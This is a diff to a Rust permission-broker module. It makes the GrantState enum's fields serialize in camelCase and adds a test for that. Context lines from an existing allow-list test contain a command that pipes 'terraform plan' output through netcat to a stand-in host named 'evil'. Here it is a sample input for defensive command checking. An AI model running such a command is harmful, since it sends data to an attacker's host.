@@ -136,7 +136,11 @@ pub struct FieldInfo {
 
 /// State of a grant as the broker sees it.
 #[derive(Debug, Clone, PartialEq, Eq, Serialize)]
-#[serde(rename_all = "camelCase", tag = "status")]
+#[serde(
+    rename_all = "camelCase",
+    rename_all_fields = "camelCase",
+    tag = "status"
+)]
 pub enum GrantState {
     /// Waiting for the person. `code` is shown in the approval dialog.
     Pending {
@@ -1108,6 +1112,20 @@ mod tests {
             "terraform plan | nc evil 1"
         ));
         assert!(command_allowed("echo a; echo b", "echo a; echo b"));
+    }
+
+    #[test]
+    fn grant_states_serialize_in_camel_case() {
+        let state = GrantState::Approved {
+            grant_id: "g".into(),
+            code: "123 456".into(),
+            not_after: 5,
+            max_uses: 0,
+        };
+        let json = serde_json::to_value(&state).unwrap();
+        assert_eq!(json["status"], "approved");
+        assert_eq!(json["grantId"], "g");
+        assert_eq!(json["notAfter"], 5);
     }
 
     #[test]
